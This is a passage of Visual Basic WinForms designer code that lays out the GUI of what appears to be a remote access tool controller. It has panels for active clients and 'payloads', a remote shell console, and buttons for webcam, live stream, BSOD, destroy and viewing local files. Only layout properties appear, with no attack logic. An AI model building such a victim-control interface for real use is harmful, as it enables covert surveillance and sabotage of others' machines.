        Me.statusftp.BackColor = System.Drawing.Color.FromArgb(CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer))
        Me.statusftp.BorderStyle = System.Windows.Forms.BorderStyle.None
        Me.statusftp.Font = New System.Drawing.Font("Nirmala UI", 9.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.statusftp.ForeColor = System.Drawing.Color.FromArgb(CType(CType(214, Byte), Integer), CType(CType(69, Byte), Integer), CType(CType(38, Byte), Integer))
        Me.statusftp.Location = New System.Drawing.Point(116, 228)
        Me.statusftp.Multiline = True
        Me.statusftp.Name = "statusftp"
        Me.statusftp.ReadOnly = True
        Me.statusftp.ShortcutsEnabled = False
        Me.statusftp.Size = New System.Drawing.Size(34, 21)
        Me.statusftp.TabIndex = 27
        Me.statusftp.Text = "off"
        Me.statusftp.WordWrap = False
        '
        'statusshell
        '
        Me.statusshell.BackColor = System.Drawing.Color.FromArgb(CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer))
        Me.statusshell.BorderStyle = System.Windows.Forms.BorderStyle.None
        Me.statusshell.Font = New System.Drawing.Font("Nirmala UI", 9.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.statusshell.ForeColor = System.Drawing.Color.FromArgb(CType(CType(214, Byte), Integer), CType(CType(69, Byte), Integer), CType(CType(38, Byte), Integer))
        Me.statusshell.Location = New System.Drawing.Point(116, 208)
        Me.statusshell.Multiline = True
        Me.statusshell.Name = "statusshell"
        Me.statusshell.ReadOnly = True
        Me.statusshell.ShortcutsEnabled = False
        Me.statusshell.Size = New System.Drawing.Size(34, 21)
        Me.statusshell.TabIndex = 26
        Me.statusshell.Text = "off"
        Me.statusshell.WordWrap = False
        '
        'Panel3
        '
        Me.Panel3.BackColor = System.Drawing.Color.Black
        Me.Panel3.Controls.Add(Me.Label8)
        Me.Panel3.Dock = System.Windows.Forms.DockStyle.Top
        Me.Panel3.Location = New System.Drawing.Point(0, 0)
        Me.Panel3.Name = "Panel3"
        Me.Panel3.Size = New System.Drawing.Size(266, 38)
        Me.Panel3.TabIndex = 23
        '
        'Label8
        '
        Me.Label8.AutoSize = True
        Me.Label8.Font = New System.Drawing.Font("Microsoft Tai Le", 9.75!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.Label8.ForeColor = System.Drawing.Color.Silver
        Me.Label8.Location = New System.Drawing.Point(13, 12)
        Me.Label8.Name = "Label8"
        Me.Label8.Size = New System.Drawing.Size(111, 16)
        Me.Label8.TabIndex = 0
        Me.Label8.Text = "&Client Information"
        '
        'losver
        '
        Me.losver.BackColor = System.Drawing.Color.FromArgb(CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer))
        Me.losver.BorderStyle = System.Windows.Forms.BorderStyle.None
        Me.losver.Font = New System.Drawing.Font("Nirmala UI", 9.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.losver.ForeColor = System.Drawing.Color.Silver
        Me.losver.Location = New System.Drawing.Point(118, 175)
        Me.losver.Multiline = True
        Me.losver.Name = "losver"
        Me.losver.ReadOnly = True
        Me.losver.ShortcutsEnabled = False
        Me.losver.Size = New System.Drawing.Size(146, 21)
        Me.losver.TabIndex = 20
        Me.losver.Text = "───────────────────"
        Me.losver.WordWrap = False
        '
        'lver
        '
        Me.lver.BackColor = System.Drawing.Color.FromArgb(CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer))
        Me.lver.BorderStyle = System.Windows.Forms.BorderStyle.None
        Me.lver.Font = New System.Drawing.Font("Nirmala UI", 9.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.lver.ForeColor = System.Drawing.Color.Silver
        Me.lver.Location = New System.Drawing.Point(118, 153)
        Me.lver.Multiline = True
        Me.lver.Name = "lver"
        Me.lver.ReadOnly = True
        Me.lver.ShortcutsEnabled = False
        Me.lver.Size = New System.Drawing.Size(146, 21)
        Me.lver.TabIndex = 19
        Me.lver.Text = "───────────────────"
        Me.lver.WordWrap = False
        '
        'ldesc
        '
        Me.ldesc.BackColor = System.Drawing.Color.FromArgb(CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer))
        Me.ldesc.BorderStyle = System.Windows.Forms.BorderStyle.None
        Me.ldesc.Cursor = System.Windows.Forms.Cursors.Hand
        Me.ldesc.Font = New System.Drawing.Font("Nirmala UI", 9.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.ldesc.ForeColor = System.Drawing.Color.Silver
        Me.ldesc.Location = New System.Drawing.Point(118, 131)
        Me.ldesc.Multiline = True
        Me.ldesc.Name = "ldesc"
        Me.ldesc.ReadOnly = True
        Me.ldesc.ShortcutsEnabled = False
        Me.ldesc.Size = New System.Drawing.Size(146, 21)
        Me.ldesc.TabIndex = 18
        Me.ldesc.Text = "───────────────────"
        Me.ldesc.WordWrap = False
        '
        'lextra
        '
        Me.lextra.BackColor = System.Drawing.Color.FromArgb(CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer))
        Me.lextra.BorderStyle = System.Windows.Forms.BorderStyle.None
        Me.lextra.Cursor = System.Windows.Forms.Cursors.Hand
        Me.lextra.Font = New System.Drawing.Font("Nirmala UI", 9.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.lextra.ForeColor = System.Drawing.Color.Silver
        Me.lextra.Location = New System.Drawing.Point(118, 109)
        Me.lextra.Multiline = True
        Me.lextra.Name = "lextra"
        Me.lextra.ReadOnly = True
        Me.lextra.ShortcutsEnabled = False
        Me.lextra.Size = New System.Drawing.Size(146, 21)
        Me.lextra.TabIndex = 17
        Me.lextra.Text = "───────────────────"
        Me.lextra.WordWrap = False
        '
        'lcustom
        '
        Me.lcustom.BackColor = System.Drawing.Color.FromArgb(CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer))
        Me.lcustom.BorderStyle = System.Windows.Forms.BorderStyle.None
        Me.lcustom.Cursor = System.Windows.Forms.Cursors.Hand
        Me.lcustom.Font = New System.Drawing.Font("Nirmala UI", 9.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.lcustom.ForeColor = System.Drawing.Color.Silver
        Me.lcustom.Location = New System.Drawing.Point(118, 87)
        Me.lcustom.Multiline = True
        Me.lcustom.Name = "lcustom"
        Me.lcustom.ReadOnly = True
        Me.lcustom.ShortcutsEnabled = False
        Me.lcustom.Size = New System.Drawing.Size(146, 21)
        Me.lcustom.TabIndex = 16
        Me.lcustom.Text = "───────────────────"
        Me.lcustom.WordWrap = False
        '
        'luser
        '
        Me.luser.BackColor = System.Drawing.Color.FromArgb(CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer))
        Me.luser.BorderStyle = System.Windows.Forms.BorderStyle.None
        Me.luser.Font = New System.Drawing.Font("Nirmala UI", 9.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.luser.ForeColor = System.Drawing.Color.Silver
        Me.luser.Location = New System.Drawing.Point(118, 65)
        Me.luser.Multiline = True
        Me.luser.Name = "luser"
        Me.luser.ReadOnly = True
        Me.luser.ShortcutsEnabled = False
        Me.luser.Size = New System.Drawing.Size(146, 21)
        Me.luser.TabIndex = 15
        Me.luser.Text = "───────────────────"
        Me.luser.WordWrap = False
        '
        'luid
        '
        Me.luid.BackColor = System.Drawing.Color.FromArgb(CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer))
        Me.luid.BorderStyle = System.Windows.Forms.BorderStyle.None
        Me.luid.Font = New System.Drawing.Font("Nirmala UI", 9.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.luid.ForeColor = System.Drawing.Color.Silver
        Me.luid.Location = New System.Drawing.Point(118, 43)
        Me.luid.Multiline = True
        Me.luid.Name = "luid"
        Me.luid.ReadOnly = True
        Me.luid.ShortcutsEnabled = False
        Me.luid.Size = New System.Drawing.Size(146, 21)
        Me.luid.TabIndex = 8
        Me.luid.Text = "───────────────────"
        Me.luid.WordWrap = False
        '
        'Label7
        '
        Me.Label7.AutoSize = True
        Me.Label7.BackColor = System.Drawing.Color.FromArgb(CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer))
        Me.Label7.Font = New System.Drawing.Font("Verdana", 8.25!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.Label7.Location = New System.Drawing.Point(9, 108)
        Me.Label7.MinimumSize = New System.Drawing.Size(106, 0)
        Me.Label7.Name = "Label7"
        Me.Label7.Padding = New System.Windows.Forms.Padding(10, 3, 0, 3)
        Me.Label7.Size = New System.Drawing.Size(106, 19)
        Me.Label7.TabIndex = 6
        Me.Label7.Text = "Extra data"
        '
        'Label6
        '
        Me.Label6.AutoSize = True
        Me.Label6.BackColor = System.Drawing.Color.FromArgb(CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer))
        Me.Label6.Font = New System.Drawing.Font("Verdana", 8.25!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.Label6.Location = New System.Drawing.Point(9, 174)
        Me.Label6.MinimumSize = New System.Drawing.Size(106, 0)
        Me.Label6.Name = "Label6"
        Me.Label6.Padding = New System.Windows.Forms.Padding(10, 3, 0, 3)
        Me.Label6.Size = New System.Drawing.Size(106, 19)
        Me.Label6.TabIndex = 5
        Me.Label6.Text = "Os Version"
        '
        'Label5
        '
        Me.Label5.AutoSize = True
        Me.Label5.BackColor = System.Drawing.Color.FromArgb(CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer))
        Me.Label5.Font = New System.Drawing.Font("Verdana", 8.25!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.Label5.Location = New System.Drawing.Point(9, 152)
        Me.Label5.MinimumSize = New System.Drawing.Size(106, 0)
        Me.Label5.Name = "Label5"
        Me.Label5.Padding = New System.Windows.Forms.Padding(10, 3, 0, 3)
        Me.Label5.Size = New System.Drawing.Size(106, 19)
        Me.Label5.TabIndex = 4
        Me.Label5.Text = "Version"
        '
        'Label4
        '
        Me.Label4.AutoSize = True
        Me.Label4.BackColor = System.Drawing.Color.FromArgb(CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer))
        Me.Label4.Font = New System.Drawing.Font("Verdana", 8.25!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.Label4.Location = New System.Drawing.Point(9, 87)
        Me.Label4.MinimumSize = New System.Drawing.Size(106, 0)
        Me.Label4.Name = "Label4"
        Me.Label4.Padding = New System.Windows.Forms.Padding(10, 3, 0, 3)
        Me.Label4.Size = New System.Drawing.Size(106, 19)
        Me.Label4.TabIndex = 3
        Me.Label4.Text = "Custom Alias"
        '
        'Label3
        '
        Me.Label3.AutoSize = True
        Me.Label3.BackColor = System.Drawing.Color.FromArgb(CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer))
        Me.Label3.Font = New System.Drawing.Font("Verdana", 8.25!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.Label3.Location = New System.Drawing.Point(9, 130)
        Me.Label3.MinimumSize = New System.Drawing.Size(106, 0)
        Me.Label3.Name = "Label3"
        Me.Label3.Padding = New System.Windows.Forms.Padding(10, 3, 0, 3)
        Me.Label3.Size = New System.Drawing.Size(106, 19)
        Me.Label3.TabIndex = 2
        Me.Label3.Text = "Pc description"
        Me.Label3.TextAlign = System.Drawing.ContentAlignment.BottomLeft
        '
        'labelusername
        '
        Me.labelusername.AutoSize = True
        Me.labelusername.BackColor = System.Drawing.Color.FromArgb(CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer))
        Me.labelusername.Font = New System.Drawing.Font("Verdana", 8.25!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.labelusername.Location = New System.Drawing.Point(9, 66)
        Me.labelusername.MinimumSize = New System.Drawing.Size(106, 0)
        Me.labelusername.Name = "labelusername"
        Me.labelusername.Padding = New System.Windows.Forms.Padding(10, 3, 0, 3)
        Me.labelusername.Size = New System.Drawing.Size(106, 19)
        Me.labelusername.TabIndex = 1
        Me.labelusername.Text = "Username"
        '
        'labeluid
        '
        Me.labeluid.AutoSize = True
        Me.labeluid.BackColor = System.Drawing.Color.FromArgb(CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer))
        Me.labeluid.Font = New System.Drawing.Font("Verdana", 8.25!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.labeluid.Location = New System.Drawing.Point(9, 43)
        Me.labeluid.MinimumSize = New System.Drawing.Size(106, 0)
        Me.labeluid.Name = "labeluid"
        Me.labeluid.Padding = New System.Windows.Forms.Padding(10, 3, 0, 3)
        Me.labeluid.Size = New System.Drawing.Size(106, 19)
        Me.labeluid.TabIndex = 0
        Me.labeluid.Text = "Identification"
        '
        'mMenu
        '
        Me.mMenu.BackColor = System.Drawing.Color.Black
        Me.mMenu.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Center
        Me.mMenu.ImageScalingSize = New System.Drawing.Size(20, 20)
        Me.mMenu.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.FileToolStripMenuItem, Me.HelpToolStripMenuItem, Me.HorizonDovaLumiereSombreToolStripMenuItem})
        Me.mMenu.Location = New System.Drawing.Point(0, 0)
        Me.mMenu.Name = "mMenu"
        Me.mMenu.RenderMode = System.Windows.Forms.ToolStripRenderMode.Professional
        Me.mMenu.Size = New System.Drawing.Size(1803, 26)
        Me.mMenu.TabIndex = 6
        Me.mMenu.Text = "MenuStrip1"
        '
        'FileToolStripMenuItem
        '
        Me.FileToolStripMenuItem.BackColor = System.Drawing.Color.Black
        Me.FileToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.btnViewClientLogs, Me.ExitToolStripMenuItem})
        Me.FileToolStripMenuItem.ForeColor = System.Drawing.Color.White
        Me.FileToolStripMenuItem.Name = "FileToolStripMenuItem"
        Me.FileToolStripMenuItem.Size = New System.Drawing.Size(37, 22)
        Me.FileToolStripMenuItem.Text = "&File"
        '
        'btnViewClientLogs
        '
        Me.btnViewClientLogs.BackColor = System.Drawing.Color.FromArgb(CType(CType(38, Byte), Integer), CType(CType(50, Byte), Integer), CType(CType(56, Byte), Integer))
        Me.btnViewClientLogs.ForeColor = System.Drawing.Color.White
        Me.btnViewClientLogs.Name = "btnViewClientLogs"
        Me.btnViewClientLogs.Size = New System.Drawing.Size(129, 22)
        Me.btnViewClientLogs.Text = "&View users"
        '
        'ExitToolStripMenuItem
        '
        Me.ExitToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(38, Byte), Integer), CType(CType(50, Byte), Integer), CType(CType(56, Byte), Integer))
        Me.ExitToolStripMenuItem.ForeColor = System.Drawing.Color.White
        Me.ExitToolStripMenuItem.Name = "ExitToolStripMenuItem"
        Me.ExitToolStripMenuItem.Size = New System.Drawing.Size(129, 22)
        Me.ExitToolStripMenuItem.Text = "&Exit"
        '
        'HelpToolStripMenuItem
        '
        Me.HelpToolStripMenuItem.ForeColor = System.Drawing.Color.White
        Me.HelpToolStripMenuItem.Name = "HelpToolStripMenuItem"
        Me.HelpToolStripMenuItem.Size = New System.Drawing.Size(44, 22)
        Me.HelpToolStripMenuItem.Text = "&Help"
        '
        'HorizonDovaLumiereSombreToolStripMenuItem
        '
        Me.HorizonDovaLumiereSombreToolStripMenuItem.Font = New System.Drawing.Font("Corbel", 11.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.HorizonDovaLumiereSombreToolStripMenuItem.ForeColor = System.Drawing.Color.Red
        Me.HorizonDovaLumiereSombreToolStripMenuItem.Name = "HorizonDovaLumiereSombreToolStripMenuItem"
        Me.HorizonDovaLumiereSombreToolStripMenuItem.Size = New System.Drawing.Size(300, 22)
        Me.HorizonDovaLumiereSombreToolStripMenuItem.Text = "Horizon Dova ┌∩┐(◣_◢)┌∩┐ LumiereSombre"
        '
        'Panel2
        '
        Me.Panel2.BackColor = System.Drawing.Color.FromArgb(CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer))
        Me.Panel2.Controls.Add(Me.Button6)
        Me.Panel2.Controls.Add(Me.btnDestroy)
        Me.Panel2.Controls.Add(Me.btnCam)
        Me.Panel2.Controls.Add(Me.btnBan)
        Me.Panel2.Controls.Add(Me.btnLocalDir)
        Me.Panel2.Controls.Add(Me.btnLive)
        Me.Panel2.Controls.Add(Me.Panel5)
        Me.Panel2.Cursor = System.Windows.Forms.Cursors.Arrow
        Me.Panel2.Location = New System.Drawing.Point(30, 383)
        Me.Panel2.Name = "Panel2"
        Me.Panel2.Size = New System.Drawing.Size(266, 208)
        Me.Panel2.TabIndex = 9
        '
        'Button6
        '
        Me.Button6.BackColor = System.Drawing.Color.Firebrick
        Me.Button6.FlatAppearance.BorderColor = System.Drawing.Color.FromArgb(CType(CType(224, Byte), Integer), CType(CType(224, Byte), Integer), CType(CType(224, Byte), Integer))
        Me.Button6.FlatAppearance.BorderSize = 0
        Me.Button6.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.Button6.Font = New System.Drawing.Font("Verdana", 8.25!)
        Me.Button6.ForeColor = System.Drawing.Color.White
        Me.Button6.Location = New System.Drawing.Point(16, 106)
        Me.Button6.Name = "Button6"
        Me.Button6.Size = New System.Drawing.Size(135, 22)
        Me.Button6.TabIndex = 30
        Me.Button6.Text = "BSOD"
        Me.Button6.TextAlign = System.Drawing.ContentAlignment.MiddleLeft
        Me.Button6.UseVisualStyleBackColor = False
        '
        'btnDestroy
        '
        Me.btnDestroy.BackColor = System.Drawing.Color.FromArgb(CType(CType(214, Byte), Integer), CType(CType(69, Byte), Integer), CType(CType(38, Byte), Integer))
        Me.btnDestroy.FlatAppearance.BorderColor = System.Drawing.Color.FromArgb(CType(CType(224, Byte), Integer), CType(CType(224, Byte), Integer), CType(CType(224, Byte), Integer))
        Me.btnDestroy.FlatAppearance.BorderSize = 0
        Me.btnDestroy.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.btnDestroy.Font = New System.Drawing.Font("Verdana", 8.25!)
        Me.btnDestroy.ForeColor = System.Drawing.Color.White
        Me.btnDestroy.Location = New System.Drawing.Point(158, 81)
        Me.btnDestroy.Name = "btnDestroy"
        Me.btnDestroy.Size = New System.Drawing.Size(92, 22)
        Me.btnDestroy.TabIndex = 29
        Me.btnDestroy.Tag = ""
        Me.btnDestroy.Text = "Destroy"
        Me.btnDestroy.UseVisualStyleBackColor = False
        '
        'btnCam
        '
        Me.btnCam.BackColor = System.Drawing.Color.Firebrick
        Me.btnCam.FlatAppearance.BorderColor = System.Drawing.Color.FromArgb(CType(CType(224, Byte), Integer), CType(CType(224, Byte), Integer), CType(CType(224, Byte), Integer))
        Me.btnCam.FlatAppearance.BorderSize = 0
        Me.btnCam.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.btnCam.Font = New System.Drawing.Font("Verdana", 8.25!)
        Me.btnCam.ForeColor = System.Drawing.Color.White
        Me.btnCam.Location = New System.Drawing.Point(16, 80)
        Me.btnCam.Name = "btnCam"
        Me.btnCam.Size = New System.Drawing.Size(135, 22)
        Me.btnCam.TabIndex = 28
        Me.btnCam.Text = "Camera"
        Me.btnCam.TextAlign = System.Drawing.ContentAlignment.MiddleLeft
        Me.btnCam.UseVisualStyleBackColor = False
        '
        'btnBan
        '
        Me.btnBan.BackColor = System.Drawing.Color.FromArgb(CType(CType(192, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.btnBan.FlatAppearance.BorderColor = System.Drawing.Color.FromArgb(CType(CType(224, Byte), Integer), CType(CType(224, Byte), Integer), CType(CType(224, Byte), Integer))
        Me.btnBan.FlatAppearance.BorderSize = 0
        Me.btnBan.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.btnBan.Font = New System.Drawing.Font("Verdana", 8.25!)
        Me.btnBan.ForeColor = System.Drawing.Color.White
        Me.btnBan.Location = New System.Drawing.Point(158, 54)
        Me.btnBan.Name = "btnBan"
        Me.btnBan.Size = New System.Drawing.Size(92, 22)
        Me.btnBan.TabIndex = 27
        Me.btnBan.Tag = ""
        Me.btnBan.Text = "Ban"
        Me.btnBan.UseVisualStyleBackColor = False
        '
        'btnLocalDir
        '
        Me.btnLocalDir.BackColor = System.Drawing.Color.FromArgb(CType(CType(38, Byte), Integer), CType(CType(50, Byte), Integer), CType(CType(56, Byte), Integer))
        Me.btnLocalDir.FlatAppearance.BorderColor = System.Drawing.Color.FromArgb(CType(CType(224, Byte), Integer), CType(CType(224, Byte), Integer), CType(CType(224, Byte), Integer))
        Me.btnLocalDir.FlatAppearance.BorderSize = 0
        Me.btnLocalDir.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.btnLocalDir.Font = New System.Drawing.Font("Verdana", 8.25!)
        Me.btnLocalDir.ForeColor = System.Drawing.Color.White
        Me.btnLocalDir.Location = New System.Drawing.Point(15, 133)
        Me.btnLocalDir.Name = "btnLocalDir"
        Me.btnLocalDir.Size = New System.Drawing.Size(137, 22)
        Me.btnLocalDir.TabIndex = 26
        Me.btnLocalDir.Text = "View Local Files"
        Me.btnLocalDir.TextAlign = System.Drawing.ContentAlignment.MiddleLeft
        Me.btnLocalDir.UseVisualStyleBackColor = False
        '
        'btnLive
        '
        Me.btnLive.BackColor = System.Drawing.Color.Firebrick
        Me.btnLive.FlatAppearance.BorderColor = System.Drawing.Color.FromArgb(CType(CType(224, Byte), Integer), CType(CType(224, Byte), Integer), CType(CType(224, Byte), Integer))
        Me.btnLive.FlatAppearance.BorderSize = 0
        Me.btnLive.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.btnLive.Font = New System.Drawing.Font("Verdana", 8.25!)
        Me.btnLive.ForeColor = System.Drawing.Color.White
        Me.btnLive.Location = New System.Drawing.Point(16, 54)
        Me.btnLive.Name = "btnLive"
        Me.btnLive.Size = New System.Drawing.Size(135, 22)
        Me.btnLive.TabIndex = 24
        Me.btnLive.Text = "Live Stream"
        Me.btnLive.TextAlign = System.Drawing.ContentAlignment.MiddleLeft
        Me.btnLive.UseVisualStyleBackColor = False
        '
        'Panel5
        '
        Me.Panel5.BackColor = System.Drawing.Color.Black
        Me.Panel5.Controls.Add(Me.Label10)
        Me.Panel5.Dock = System.Windows.Forms.DockStyle.Top
        Me.Panel5.Location = New System.Drawing.Point(0, 0)
        Me.Panel5.Name = "Panel5"
        Me.Panel5.Size = New System.Drawing.Size(266, 37)
        Me.Panel5.TabIndex = 22
        '
        'Label10
        '
        Me.Label10.AutoSize = True
        Me.Label10.Font = New System.Drawing.Font("Microsoft Tai Le", 9.75!)
        Me.Label10.ForeColor = System.Drawing.Color.Silver
        Me.Label10.Location = New System.Drawing.Point(13, 12)
        Me.Label10.Name = "Label10"
        Me.Label10.Size = New System.Drawing.Size(99, 16)
        Me.Label10.TabIndex = 0
        Me.Label10.Text = "&Active payloads"
        '
        'Panel9
        '
        Me.Panel9.BackColor = System.Drawing.Color.Black
        Me.Panel9.Controls.Add(Me.Label12)
        Me.Panel9.Dock = System.Windows.Forms.DockStyle.Top
        Me.Panel9.Location = New System.Drawing.Point(0, 0)
        Me.Panel9.Name = "Panel9"
        Me.Panel9.Size = New System.Drawing.Size(266, 34)
        Me.Panel9.TabIndex = 22
        '
        'Label12
        '
        Me.Label12.AutoSize = True
        Me.Label12.Font = New System.Drawing.Font("Microsoft Tai Le", 9.75!)
        Me.Label12.ForeColor = System.Drawing.Color.Silver
        Me.Label12.Location = New System.Drawing.Point(14, 11)
        Me.Label12.Name = "Label12"
        Me.Label12.Size = New System.Drawing.Size(82, 16)
        Me.Label12.TabIndex = 0
        Me.Label12.Text = "Active clients"
        '
        'cmd
        '
        Me.cmd.BackColor = System.Drawing.Color.FromArgb(CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer))
        Me.cmd.BorderStyle = System.Windows.Forms.BorderStyle.None
        Me.cmd.CausesValidation = False
        Me.cmd.ContextMenuStrip = Me.shellContextMenu
        Me.cmd.Font = New System.Drawing.Font("Consolas", 12.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.cmd.ForeColor = System.Drawing.Color.FromArgb(CType(CType(214, Byte), Integer), CType(CType(69, Byte), Integer), CType(CType(38, Byte), Integer))
        Me.cmd.Location = New System.Drawing.Point(5, 7)
        Me.cmd.Name = "cmd"
        Me.cmd.ScrollBars = System.Windows.Forms.RichTextBoxScrollBars.ForcedVertical
        Me.cmd.Size = New System.Drawing.Size(1223, 508)
        Me.cmd.TabIndex = 23
        Me.cmd.Text = "                                    Horizon Dova ┌∩┐(◣_◢)┌∩┐ LumiereSombre" & Global.Microsoft.VisualBasic.ChrW(10)
        '
        'shellContextMenu
        '
        Me.shellContextMenu.BackColor = System.Drawing.Color.FromArgb(CType(CType(38, Byte), Integer), CType(CType(50, Byte), Integer), CType(CType(56, Byte), Integer))
        Me.shellContextMenu.ImageScalingSize = New System.Drawing.Size(20, 20)
        Me.shellContextMenu.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.shellBtnCancel})
        Me.shellContextMenu.Name = "ftpMenuEmptyClick"
        Me.shellContextMenu.RenderMode = System.Windows.Forms.ToolStripRenderMode.System
        Me.shellContextMenu.Size = New System.Drawing.Size(111, 26)
        '
        'shellBtnCancel
        '
        Me.shellBtnCancel.ForeColor = System.Drawing.Color.White
        Me.shellBtnCancel.Name = "shellBtnCancel"
        Me.shellBtnCancel.Size = New System.Drawing.Size(110, 22)
        Me.shellBtnCancel.Text = "&Cancel"
        '
        'panelDebugView
        '
        Me.panelDebugView.BackColor = System.Drawing.Color.FromArgb(CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer))
        Me.panelDebugView.Controls.Add(Me.TableLayoutPanel1)
        Me.panelDebugView.Controls.Add(Me.Panel13)
        Me.panelDebugView.Location = New System.Drawing.Point(30, 597)
        Me.panelDebugView.Name = "panelDebugView"
        Me.panelDebugView.Size = New System.Drawing.Size(1753, 179)
        Me.panelDebugView.TabIndex = 13
        '
        'TableLayoutPanel1
        '
        Me.TableLayoutPanel1.ColumnCount = 2
        Me.TableLayoutPanel1.ColumnStyles.Add(New System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Percent, 50.0!))
        Me.TableLayoutPanel1.ColumnStyles.Add(New System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Percent, 50.0!))
        Me.TableLayoutPanel1.Controls.Add(Me.debugLowLevelView, 1, 0)
        Me.TableLayoutPanel1.Controls.Add(Me.debugView, 0, 0)
        Me.TableLayoutPanel1.Dock = System.Windows.Forms.DockStyle.Fill
        Me.TableLayoutPanel1.Location = New System.Drawing.Point(0, 31)
        Me.TableLayoutPanel1.Name = "TableLayoutPanel1"
        Me.TableLayoutPanel1.RowCount = 1
        Me.TableLayoutPanel1.RowStyles.Add(New System.Windows.Forms.RowStyle(System.Windows.Forms.SizeType.Percent, 50.0!))
        Me.TableLayoutPanel1.Size = New System.Drawing.Size(1753, 148)
        Me.TableLayoutPanel1.TabIndex = 24
        '
        'debugLowLevelView
        '
        Me.debugLowLevelView.BackColor = System.Drawing.Color.FromArgb(CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer))
        Me.debugLowLevelView.BorderStyle = System.Windows.Forms.BorderStyle.None
        Me.debugLowLevelView.CausesValidation = False
        Me.debugLowLevelView.DetectUrls = False
        Me.debugLowLevelView.Dock = System.Windows.Forms.DockStyle.Fill
        Me.debugLowLevelView.Font = New System.Drawing.Font("Consolas", 9.75!)
        Me.debugLowLevelView.Location = New System.Drawing.Point(879, 3)
        Me.debugLowLevelView.Name = "debugLowLevelView"
        Me.debugLowLevelView.ScrollBars = System.Windows.Forms.RichTextBoxScrollBars.ForcedVertical
        Me.debugLowLevelView.Size = New System.Drawing.Size(871, 142)
        Me.debugLowLevelView.TabIndex = 24
        Me.debugLowLevelView.Text = ""
        '
        'debugView
        '
        Me.debugView.BackColor = System.Drawing.Color.FromArgb(CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer))
        Me.debugView.BorderStyle = System.Windows.Forms.BorderStyle.None
        Me.debugView.CausesValidation = False
        Me.debugView.DetectUrls = False
        Me.debugView.Dock = System.Windows.Forms.DockStyle.Fill
        Me.debugView.Font = New System.Drawing.Font("Consolas", 9.75!)
        Me.debugView.Location = New System.Drawing.Point(3, 3)
        Me.debugView.Name = "debugView"
        Me.debugView.ScrollBars = System.Windows.Forms.RichTextBoxScrollBars.ForcedVertical
